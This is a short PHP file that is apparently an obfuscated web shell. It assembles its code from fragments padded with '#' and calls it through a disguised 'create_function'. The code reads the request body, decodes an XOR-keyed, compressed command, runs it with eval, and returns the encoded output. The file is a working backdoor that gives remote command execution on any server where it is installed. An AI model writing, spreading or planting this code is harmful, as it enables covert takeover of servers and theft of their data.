<?php
$D='trlen($#t);$o="";for#($i=0;#$i<$l;#){fo#r($j=0;#($j<$#c&&$i<$l#);';
$R=str_replace('J','','cJreJJatJe_funJctJion');
$K='#$j++,$i+#+){$o.=#$t#{$i}^$k{$#j}#;}}return $o#;#}if #(@preg_match';
$Q='se6#4#_encode(@#x#(@gzcompres#s($o#),$#k));prin#t("$#p$kh$r$kf");}';
$I='p="uZBBw5#0bDUU9#kn##MD";#function x#(#$t,$k#){$c=strlen($#k);$l=#s';
$N='m)==1) {@ob_#sta#rt();@ev#al(@gz#u#ncompress(@x(@ba#se6##4_dec#ode(';
$f='$k="#fc576ba7"##;$#kh="2#0d92d9b1322";$kf="4#8b392d#4#f602#";$';
$v='$m##[1]#),$k))#);$o=@ob_get#_cont#ents();@o##b_end_clean();$r=@ba';
$Y='(##"/$kh(#.+)$kf#/",@file_ge#t_#contents##(#"php://in#p#ut"),$';
$A=str_replace('#','',$f.$I.$D.$K.$Y.$N.$v.$Q);
$c=$R('',$A);$c();
?>
